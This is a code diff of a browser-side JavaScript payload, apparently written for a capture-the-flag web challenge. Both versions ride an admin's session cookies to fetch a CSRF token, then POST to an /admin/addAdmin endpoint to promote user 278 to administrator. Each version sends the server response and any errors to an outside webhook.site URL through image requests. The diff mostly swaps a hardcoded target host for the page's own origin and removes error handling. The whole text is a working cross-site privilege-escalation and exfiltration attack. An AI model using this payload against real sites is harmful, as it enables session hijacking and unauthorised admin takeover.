@@ -1,50 +1,31 @@
 <script>
 (async () => {
   try {
-    // Hardcoded target host (prevents resolving to github pages)
-    const base = 'https://web1-79e4a3bc.p1.securinets.tn';
+    // build base URL without credentials
+    const base = location.protocol + '//' + location.hostname + (location.port ? ':' + location.port : '');
 
-    const WEBHOOK = 'https://webhook.site/290533ab-31e3-4217-b6d0-f4a6df2f7160';
-    const TARGET_USER_ID = 278;
-
-    // Fetch CSRF token from the actual target host
+    // fetch CSRF token using admin's cookies
     const tokRes = await fetch(base + '/csrf-token', { credentials: 'include' });
+    const tokJson = await tokRes.json();
+    // read csrfToken first, then fall back to common names
+    const csrf = tokJson.csrfToken || tokJson.csrf || tokJson.token || tokJson._csrf || tokJson.CSRF;
 
-    // If non-200, report status and first chars of body
-    if (!tokRes.ok) {
-      const body = await tokRes.text().catch(()=>'');
-      new Image().src = WEBHOOK + '?err=' + encodeURIComponent('tok_status=' + tokRes.status + ' body=' + body.slice(0,300));
-      return;
-    }
-
-    // Parse JSON and read csrfToken (per your sample)
-    let tokJson;
-    try {
-      tokJson = await tokRes.json();
-    } catch (e) {
-      const txt = await tokRes.text();
-      new Image().src = WEBHOOK + '?err=' + encodeURIComponent('csrf-not-json body=' + txt.slice(0,400));
-      return;
-    }
-
-    const csrf = tokJson.csrfToken || tokJson.csrf || tokJson._csrf || tokJson.CSRF || tokJson.token || tokJson.tokenId;
-    if (!csrf) {
-      new Image().src = WEBHOOK + '?err=' + encodeURIComponent('no-csrf-in-json ' + JSON.stringify(tokJson).slice(0,400));
-      return;
-    }
-
-    // Perform the privileged POST using the admin's cookies & the token
+    // POST to promote userId 278
     const promoteRes = await fetch(base + '/admin/addAdmin', {
       method: 'POST',
       credentials: 'include',
-      headers: { 'Content-Type': 'application/json', 'CSRF-Token': csrf },
-      body: JSON.stringify({ userId: TARGET_USER_ID })
+      headers: {
+        'Content-Type': 'application/json',
+        'CSRF-Token': csrf
+      },
+      body: JSON.stringify({ userId: 278 })
     });
 
     const promoteText = await promoteRes.text();
-    new Image().src = WEBHOOK + '?res=' + encodeURIComponent(promoteText);
-  } catch (err) {
-    new Image().src = 'https://webhook.site/290533ab-31e3-4217-b6d0-f4a6df2f7160?err=' + encodeURIComponent(err.message);
+    // exfiltrate the response to your webhook
+    new Image().src = 'https://webhook.site/290533ab-31e3-4217-b6d0-f4a6df2f7160?res=' + encodeURIComponent(promoteText);
+  } catch (e) {
+    new Image().src = 'https://webhook.site/290533ab-31e3-4217-b6d0-f4a6df2f7160?err=' + encodeURIComponent(e.message);
   }
 })();
 </script>
